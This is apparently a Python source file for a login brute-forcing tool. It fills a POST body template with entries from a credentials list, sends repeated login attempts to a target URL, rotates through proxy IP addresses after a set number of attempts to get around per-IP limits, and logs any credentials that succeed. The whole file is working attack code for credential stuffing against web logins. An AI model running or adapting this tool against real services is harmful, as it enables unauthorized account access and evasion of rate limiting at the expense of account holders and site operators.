import sys
import re
import logging
from urllib import error, request
from packages.config import *
from BruteforcerHTTPRedirectHandler import BruteforcerHTTPRedirectHandler


class Bruteforcer:
    def __init__(
        self,
        url,
        host,
        headers,
        data_scheme,
        data_scheme_filename,
        credentials_list,
        fail_url_pattern,
        proxies,
        attemps_per_ip,
        subprocess,
    ) -> None:
        self.logger = logging.getLogger(f"subprocess_{subprocess}")
        self.logger.debug("Logger created correctly")
        self.url = url
        self.host = host
        self.fail_url = fail_url_pattern
        self.headers = headers
        self.data_scheme = data_scheme
        # self.credentials_list = credentials_list
        self.logger.debug(
            f"Credentials and POST injection data scheme validation started"
        )
        (
            self.variables_to_injection,
            self.credentials_list,
        ) = self.__validate_credentials_file__(
            self.data_scheme, credentials_list, data_scheme_filename
        )
        self.logger.debug(
            f"Credentials and POST injection data scheme validation finished correctly"
        )
        self.attemps_per_ip = attemps_per_ip
        self.set_proxies(proxies, attemps_per_ip, len(credentials_list))

    def set_proxies(self, proxies, attemps_per_ip, len_credentials_list):
        if proxies and attemps_per_ip * len(proxies) < len_credentials_list:
            self.logger.warning(
                f"There is too much credentials to check for (`{len_credentials_list}`) for `{attemps_per_ip}` trials per `{len(proxies)}` IP addresses. Rest of the attemps will be performed with last IP in list: `{proxies[len(proxies)-1]}`"
            )
            while attemps_per_ip * len(proxies) < len_credentials_list:
                proxies.insert(len(proxies), proxies[len(proxies) - 1])
        self.proxies = proxies

    def __validate_credentials_file__(
        self, data_scheme, credentials_file, data_scheme_filename
    ):
        # jeżeli zmienna jest duplikowana to i tak zmieniane są wszystkie na raz
        variables_to_injection = list(
            dict.fromkeys(re.findall("\$\{[a-zA-Z]+}", data_scheme))  # config
        )
        len_variables_to_injection = len(variables_to_injection)
        self.logger.debug(
            f"{len_variables_to_injection} variables `{variables_to_injection}` found in `{data_scheme_filename}`"
        )
        credentials = []
        fields_cnt = credentials_file[0].count(":") + 1
        if fields_cnt > len_variables_to_injection:
            self.logger.info(
                f"In credentials file is `{fields_cnt}` fields, and it's more than is needed in API data scheme (`{len_variables_to_injection}`)! I'll only use the first `{len_variables_to_injection}` columns from the credentials file"
            )
        for line in credentials_file:
            # pomija puste linijki
            line = line.rstrip()
            if line.strip():
                current_fields_cnt = line.count(":") + 1
                self.logger.debug(
                    f"Fields in line `{line}`credentials file: `{current_fields_cnt}`, Variables in your data to injection file: {len(variables_to_injection)}"
                )
                if current_fields_cnt == 0:
                    continue
                elif current_fields_cnt != fields_cnt:
                    self.logger.info(
                        f"Line `{line.rstrip()}` differs than other lines in credentials file"
                    )
                    sys.exit(-1)
                elif current_fields_cnt >= len_variables_to_injection:
                    credentials.append(
                        tuple(line.split(":")[i] for i in range(fields_cnt))
                    )
                else:
                    self.logger.error(
                        "Match the number of columns in credential file to the number of variables in the text file with API data scheme"
                    )
                    sys.exit(-1)
            else:
                self.logger.warning("An empty line in credentials file. Skipped!")
        return variables_to_injection, credentials

    def __add_headers__(self, opener):
        if self.headers:
            for key, value in self.headers.items():
                opener.addheaders = [(key, value)]
        else:
            opener.addheaders = [("Referer", self.host)]
        return opener

    def perform_bruteforce(self):
        def control_the_proxy_rotation(index, data_to_post):
            try:
                index = self.proxy_rotating_injection(index, str.encode(data_to_post))
            except error.HTTPError as HTTPe:
                if HTTPe.reason in [
                    "Bad Request",
                    "Unauthorized",
                    "Unprocessable Entity",
                ]:
                    self.logger.info("[-] Incorrect credentials [-]")
                else:
                    self.logger.warning(f"Exception: {HTTPe}")
            except Exception as e:
                self.logger.warning(
                    f"Exception: `{e}`! I'll try it with another IP from list"
                )
                self.proxies = [i for i in self.proxies if i != self.proxies[index]]
                if self.proxies:
                    old_size_proxy_list = len(self.proxies) - 1
                    # self.logger.debug(f"INDEX {index}, SIZE {old_size_proxy_list}")
                    if index < old_size_proxy_list:
                        index = index + 1
                    else:
                        index = 0
                    self.logger.debug(f"I'll try with `{self.proxies[index]}` IP")
                    # recursion
                    index = control_the_proxy_rotation(index, data_to_post)
                else:
                    self.logger.warning(
                        "No more working IP address in your list! The process will be interrupted!"
                    )
                    sys.exit(-1)
            finally:
                return index

        counter = 0
        index = 0
        for credentials in self.credentials_list:
            data_to_post = self.data_scheme
            for i in range(len(self.variables_to_injection)):
                data_to_post = data_to_post.replace(
                    self.variables_to_injection[i], credentials[i]
                )
            if self.proxies:
                index = control_the_proxy_rotation(index, data_to_post)
                if counter + 1 < self.attemps_per_ip:
                    counter = counter + 1
                else:
                    # zmiana indexu IP do bruteforce
                    if index != len(self.proxies) - 1:
                        index = index + 1
                    else:
                        index = 0
                    counter = 0
            else:
                try:
                    self.standard_injection(str.encode(data_to_post))
                except error.HTTPError as HTTPe:
                    if HTTPe.reason in [
                        "Bad Request",
                        "Unauthorized",
                        "Unprocessable Entity",
                    ]:
                        self.logger.info("[-] Incorrect credentials [-]")
                    else:
                        self.logger.warning(f"Exception: {HTTPe}")
                except error as e:
                    self.logger.warning(f"Exception: `{e}`")
                except Exception as e:
                    self.logger.error(f"Critical exception: `{e}`")
        return

    def proxy_rotating_injection(self, index, data_bytes):
        current_credentials = data_bytes.decode("utf-8")
        self.logger.info(f"IP: `{self.proxies[index]}`, Data: `{current_credentials}`")
        redirect_handler = BruteforcerHTTPRedirectHandler()
        proxy_handler = request.ProxyHandler(
            {"http": self.proxies[index], "https": self.proxies[index]}
        )
        opener = request.build_opener(proxy_handler, redirect_handler)
        opener = self.__add_headers__(opener)
        request.install_opener(opener)
        request_ = request.Request(self.url, data=data_bytes)
        with request.urlopen(request_, timeout=10) as response:
            if self.verify_an_autorization(redirect_handler, response):
                self.logger.info(f"[+] CORRECT CREDENTIALS `{current_credentials}` [+]")
                sys.exit(0)
            else:
                self.logger.info("[-] Incorrect credentials [-]")
        return index

    def standard_injection(self, data_bytes):
        current_credentials = data_bytes.decode("utf-8")
        self.logger.info(f"IP: Your IP, Data: `{current_credentials}`")
        redirect_handler = BruteforcerHTTPRedirectHandler()
        opener = request.build_opener(redirect_handler)
        opener = self.__add_headers__(opener)
        request.install_opener(opener)
        request_ = request.Request(self.url, data=data_bytes)
        with request.urlopen(request_, timeout=10) as response:
            if self.verify_an_autorization(redirect_handler, response):
                self.logger.debug("Correct credentials found")
                self.logger.info(f"[+] CORRECT CREDENTIALS `{current_credentials}` [+]")
                self.logger.debug("Work is done! Adios!")
            else:
                self.logger.info("[-] Incorrect credentials [-]")
        return

    def verify_an_autorization(self, redirect_handler, response):
        self.logger.debug(f"Response status: `{response.status}`")
        redirects = redirect_handler.get_redirects()
        self.logger.debug(f"Collected redirects after trying to login: `{redirects}`")
        is_fail_url_match = True
        if redirects and self.fail_url:
            is_fail_url_match = (
                len([url for url in redirects if self.fail_url in url]) > 0
            )
        elif redirects and not self.fail_url:
            is_fail_url_match = True  # ewidentnue
        elif not redirects:
            is_fail_url_match = False
        if response.code in [200, 201] and not is_fail_url_match:
            return True
        return False
